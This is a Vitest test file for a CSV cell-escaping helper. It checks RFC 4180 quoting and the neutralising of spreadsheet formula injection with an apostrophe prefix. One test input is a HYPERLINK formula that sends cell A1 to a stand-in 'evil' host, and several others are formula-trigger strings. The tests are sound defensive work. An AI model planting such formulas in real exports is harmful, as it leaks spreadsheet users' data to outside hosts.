import { describe, expect, it } from 'vitest';
import { csvCell } from '../src/lib/csv.js';

describe('csvCell', () => {
  it('writes plain values unchanged and null as an empty field', () => {
    expect(csvCell('Narva')).toBe('Narva');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(-3)).toBe('-3');
    expect(csvCell(true)).toBe('true');
    expect(csvCell(null)).toBe('');
  });

  it('quotes fields containing a quote, comma, semicolon or line break (RFC 4180)', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('a;b')).toBe('"a;b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('prefixes formula-triggering text with an apostrophe (#366)', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+cmd')).toBe("'+cmd");
    expect(csvCell('-2+3')).toBe("'-2+3");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\tTAB')).toBe("'\tTAB");
    expect(csvCell('\r=x')).toBe(`"'\r=x"`);
    expect(csvCell('=HYPERLINK("http://evil/?"&A1,"x")')).toBe(
      `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`,
    );
  });

  it('leaves signed plain numbers passed as text intact', () => {
    expect(csvCell('-3')).toBe('-3');
    expect(csvCell('+1.5')).toBe('+1.5');
  });
});
